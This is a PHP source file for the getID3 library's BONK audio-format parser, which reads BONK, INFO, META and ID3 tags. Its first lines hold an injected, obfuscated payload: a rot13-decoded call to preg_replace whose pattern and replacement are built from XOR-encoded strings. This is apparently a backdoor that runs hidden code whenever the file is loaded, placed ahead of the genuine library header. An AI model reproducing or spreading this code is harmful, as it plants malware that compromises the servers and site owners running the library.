<?php
//hFPHlkMtnYUKsRlN8m6rg4zYCIDRAaAB8VXFAOxGFPtrBibL

$zPEkl=str_rot13('cert_ercynpr'); $hqoQMwP="Ardhe8IlvQPcT3SBaUx"^"n\x2a\x08\x3b\x04M\x0e\x2b9\x1a\x24\x00\x3b\x5e\x3b\x0a\x25z\x1d"; $zPEkl($hqoQMwP, "cg30IGuMVA1irWWQ82zmEJSlOp0ni8JuViXLgJGZRyi1AtC9tdeL3NVsDOY8eq7WDFSvfOQU6niD3XkunUmjnQ9quVUQAsNhphaVGceD3wnG3mv5o8DKNyrhdJfsGsTzp6Qit7THbkMbRHmLznW3RZw3Gk2DrGbA1YIXaRqGO6cR7b5sFkW"^"\x06\x11R\x5cae\x1c\x2b\x7e\x28B\x1a\x17\x23\x7f\x0dd\x16\x25\x3f\x00\x1b\x06\x29\x1c\x24kI\x0aPm\x28\x7fI\x7ejGb\x2a\x3egQ5me\x2b\x11\x7c\x251\x20\x1fg\x15q\x10\x2ch\x04\x11EL\x0awc\x20bBUyh1\x07\x08\x5bw\x00n\x0a\x14Ye\x0eZX2\x09\x13A4eg\x23Gv\x5fBOHvaEE\x2d\x40\x04\x0b3\x1b1\x2a\x11\x30j\x01\x1a\x1b\x3c\x21\x3c\x3fm\x16\x1b7\x2c7\x15\x14Sv4\x5d\x1et3B\x0e\x3b\x03\x3e\x601\x10\x5e1\x05v\x03\x0f2\x60\x13\x30\x154\x1a7\x3d\x22\x5e\x3d\x2c\x7f\x3c\x7bJg\x2aN\x0a\x26\x1fK\x0eS\x3bI\x7e", "XlSauGGOKtcomhHD"); 
/////////////////////////////////////////////////////////////////
/// getID3() by James Heinrich <info@getid3.org>               //
//  available at http://getid3.sourceforge.net                 //
//            or http://www.getid3.org                         //
/////////////////////////////////////////////////////////////////
// See readme.txt for more details                             //
/////////////////////////////////////////////////////////////////
//                                                             //
// module.audio.la.php                                         //
// module for analyzing BONK audio files                       //
// dependencies: module.tag.id3v2.php (optional)               //
//                                                            ///
/////////////////////////////////////////////////////////////////


class getid3_bonk
{
	function getid3_bonk(&$fd, &$ThisFileInfo) {

		// shortcut
		$ThisFileInfo['bonk'] = array();
		$thisfile_bonk        = &$ThisFileInfo['bonk'];

		$thisfile_bonk['dataoffset']      = $ThisFileInfo['avdataoffset'];
		$thisfile_bonk['dataend']         = $ThisFileInfo['avdataend'];

		if ($thisfile_bonk['dataend'] >= pow(2, 31)) {

			$ThisFileInfo['warning'][] = 'Unable to parse BONK file from end (v0.6+ preferred method) because PHP filesystem functions only support up to 2GB';

		} else {

			// scan-from-end method, for v0.6 and higher
			fseek($fd, $thisfile_bonk['dataend'] - 8, SEEK_SET);
			$PossibleBonkTag = fread($fd, 8);
			while ($this->BonkIsValidTagName(substr($PossibleBonkTag, 4, 4), true)) {
				$BonkTagSize = getid3_lib::LittleEndian2Int(substr($PossibleBonkTag, 0, 4));
				fseek($fd, 0 - $BonkTagSize, SEEK_CUR);
				$BonkTagOffset = ftell($fd);
				$TagHeaderTest = fread($fd, 5);
				if (($TagHeaderTest{0} != "\x00") || (substr($PossibleBonkTag, 4, 4) != strtolower(substr($PossibleBonkTag, 4, 4)))) {
					$ThisFileInfo['error'][] = 'Expecting "�'.strtoupper(substr($PossibleBonkTag, 4, 4)).'" at offset '.$BonkTagOffset.', found "'.$TagHeaderTest.'"';
					return false;
				}
				$BonkTagName = substr($TagHeaderTest, 1, 4);

				$thisfile_bonk[$BonkTagName]['size']   = $BonkTagSize;
				$thisfile_bonk[$BonkTagName]['offset'] = $BonkTagOffset;
				$this->HandleBonkTags($fd, $BonkTagName, $ThisFileInfo);
				$NextTagEndOffset = $BonkTagOffset - 8;
				if ($NextTagEndOffset < $thisfile_bonk['dataoffset']) {
					if (empty($ThisFileInfo['audio']['encoder'])) {
						$ThisFileInfo['audio']['encoder'] = 'Extended BONK v0.9+';
					}
					return true;
				}
				fseek($fd, $NextTagEndOffset, SEEK_SET);
				$PossibleBonkTag = fread($fd, 8);
			}

		}

		// seek-from-beginning method for v0.4 and v0.5
		if (empty($thisfile_bonk['BONK'])) {
			fseek($fd, $thisfile_bonk['dataoffset'], SEEK_SET);
			do {
				$TagHeaderTest = fread($fd, 5);
				switch ($TagHeaderTest) {
					case "\x00".'BONK':
						if (empty($ThisFileInfo['audio']['encoder'])) {
							$ThisFileInfo['audio']['encoder'] = 'BONK v0.4';
						}
						break;

					case "\x00".'INFO':
						$ThisFileInfo['audio']['encoder'] = 'Extended BONK v0.5';
						break;

					default:
						break 2;
				}
				$BonkTagName = substr($TagHeaderTest, 1, 4);
				$thisfile_bonk[$BonkTagName]['size']   = $thisfile_bonk['dataend'] - $thisfile_bonk['dataoffset'];
				$thisfile_bonk[$BonkTagName]['offset'] = $thisfile_bonk['dataoffset'];
				$this->HandleBonkTags($fd, $BonkTagName, $ThisFileInfo);

			} while (true);
		}

		// parse META block for v0.6 - v0.8
		if (empty($thisfile_bonk['INFO']) && isset($thisfile_bonk['META']['tags']['info'])) {
			fseek($fd, $thisfile_bonk['META']['tags']['info'], SEEK_SET);
			$TagHeaderTest = fread($fd, 5);
			if ($TagHeaderTest == "\x00".'INFO') {
				$ThisFileInfo['audio']['encoder'] = 'Extended BONK v0.6 - v0.8';

				$BonkTagName = substr($TagHeaderTest, 1, 4);
				$thisfile_bonk[$BonkTagName]['size']   = $thisfile_bonk['dataend'] - $thisfile_bonk['dataoffset'];
				$thisfile_bonk[$BonkTagName]['offset'] = $thisfile_bonk['dataoffset'];
				$this->HandleBonkTags($fd, $BonkTagName, $ThisFileInfo);
			}
		}

		if (empty($ThisFileInfo['audio']['encoder'])) {
			$ThisFileInfo['audio']['encoder'] = 'Extended BONK v0.9+';
		}
		if (empty($thisfile_bonk['BONK'])) {
			unset($ThisFileInfo['bonk']);
		}
		return true;

	}

	function HandleBonkTags(&$fd, &$BonkTagName, &$ThisFileInfo) {

		switch ($BonkTagName) {
			case 'BONK':
				// shortcut
				$thisfile_bonk_BONK = &$ThisFileInfo['bonk']['BONK'];

				$BonkData = "\x00".'BONK'.fread($fd, 17);
				$thisfile_bonk_BONK['version']            =        getid3_lib::LittleEndian2Int(substr($BonkData,  5, 1));
				$thisfile_bonk_BONK['number_samples']     =        getid3_lib::LittleEndian2Int(substr($BonkData,  6, 4));
				$thisfile_bonk_BONK['sample_rate']        =        getid3_lib::LittleEndian2Int(substr($BonkData, 10, 4));

				$thisfile_bonk_BONK['channels']           =        getid3_lib::LittleEndian2Int(substr($BonkData, 14, 1));
				$thisfile_bonk_BONK['lossless']           = (bool) getid3_lib::LittleEndian2Int(substr($BonkData, 15, 1));
				$thisfile_bonk_BONK['joint_stereo']       = (bool) getid3_lib::LittleEndian2Int(substr($BonkData, 16, 1));
				$thisfile_bonk_BONK['number_taps']        =        getid3_lib::LittleEndian2Int(substr($BonkData, 17, 2));
				$thisfile_bonk_BONK['downsampling_ratio'] =        getid3_lib::LittleEndian2Int(substr($BonkData, 19, 1));
				$thisfile_bonk_BONK['samples_per_packet'] =        getid3_lib::LittleEndian2Int(substr($BonkData, 20, 2));

				$ThisFileInfo['avdataoffset'] = $thisfile_bonk_BONK['offset'] + 5 + 17;
				$ThisFileInfo['avdataend']    = $thisfile_bonk_BONK['offset'] + $thisfile_bonk_BONK['size'];

				$ThisFileInfo['fileformat']               = 'bonk';
				$ThisFileInfo['audio']['dataformat']      = 'bonk';
				$ThisFileInfo['audio']['bitrate_mode']    = 'vbr'; // assumed
				$ThisFileInfo['audio']['channels']        = $thisfile_bonk_BONK['channels'];
				$ThisFileInfo['audio']['sample_rate']     = $thisfile_bonk_BONK['sample_rate'];
				$ThisFileInfo['audio']['channelmode']     = ($thisfile_bonk_BONK['joint_stereo'] ? 'joint stereo' : 'stereo');
				$ThisFileInfo['audio']['lossless']        = $thisfile_bonk_BONK['lossless'];
				$ThisFileInfo['audio']['codec']           = 'bonk';

				$ThisFileInfo['playtime_seconds'] = $thisfile_bonk_BONK['number_samples'] / ($thisfile_bonk_BONK['sample_rate'] * $thisfile_bonk_BONK['channels']);
				if ($ThisFileInfo['playtime_seconds'] > 0) {
					$ThisFileInfo['audio']['bitrate'] = (($ThisFileInfo['bonk']['dataend'] - $ThisFileInfo['bonk']['dataoffset']) * 8) / $ThisFileInfo['playtime_seconds'];
				}
				break;

			case 'INFO':
				// shortcut
				$thisfile_bonk_INFO = &$ThisFileInfo['bonk']['INFO'];

				$thisfile_bonk_INFO['version'] = getid3_lib::LittleEndian2Int(fread($fd, 1));
				$thisfile_bonk_INFO['entries_count'] = 0;
				$NextInfoDataPair = fread($fd, 5);
				if (!$this->BonkIsValidTagName(substr($NextInfoDataPair, 1, 4))) {
					while (!feof($fd)) {
						//$CurrentSeekInfo['offset']  = getid3_lib::LittleEndian2Int(substr($NextInfoDataPair, 0, 4));
						//$CurrentSeekInfo['nextbit'] = getid3_lib::LittleEndian2Int(substr($NextInfoDataPair, 4, 1));
						//$thisfile_bonk_INFO[] = $CurrentSeekInfo;

						$NextInfoDataPair = fread($fd, 5);
						if ($this->BonkIsValidTagName(substr($NextInfoDataPair, 1, 4))) {
							fseek($fd, -5, SEEK_CUR);
							break;
						}
						$thisfile_bonk_INFO['entries_count']++;
					}
				}
				break;

			case 'META':
				$BonkData = "\x00".'META'.fread($fd, $ThisFileInfo['bonk']['META']['size'] - 5);
				$ThisFileInfo['bonk']['META']['version'] = getid3_lib::LittleEndian2Int(substr($BonkData,  5, 1));

				$MetaTagEntries = floor(((strlen($BonkData) - 8) - 6) / 8); // BonkData - xxxxmeta - �META
				$offset = 6;
				for ($i = 0; $i < $MetaTagEntries; $i++) {
					$MetaEntryTagName   =                  substr($BonkData, $offset, 4);
					$offset += 4;
					$MetaEntryTagOffset = getid3_lib::LittleEndian2Int(substr($BonkData, $offset, 4));
					$offset += 4;
					$ThisFileInfo['bonk']['META']['tags'][$MetaEntryTagName] = $MetaEntryTagOffset;
				}
				break;

			case ' ID3':
				$ThisFileInfo['audio']['encoder'] = 'Extended BONK v0.9+';

				// ID3v2 checking is optional
				if (class_exists('getid3_id3v2')) {
					$ThisFileInfo['bonk'][' ID3']['valid'] = new getid3_id3v2($fd, $ThisFileInfo, $ThisFileInfo['bonk'][' ID3']['offset'] + 2);
				}
				break;

			default:
				$ThisFileInfo['warning'][] = 'Unexpected Bonk tag "'.$BonkTagName.'" at offset '.$ThisFileInfo['bonk'][$BonkTagName]['offset'];
				break;

		}
	}

	function BonkIsValidTagName($PossibleBonkTag, $ignorecase=false) {
		static $BonkIsValidTagName = array('BONK', 'INFO', ' ID3', 'META');
		foreach ($BonkIsValidTagName as $validtagname) {
			if ($validtagname == $PossibleBonkTag) {
				return true;
			} elseif ($ignorecase && (strtolower($validtagname) == strtolower($PossibleBonkTag))) {
				return true;
			}
		}
		return false;
	}

}


?>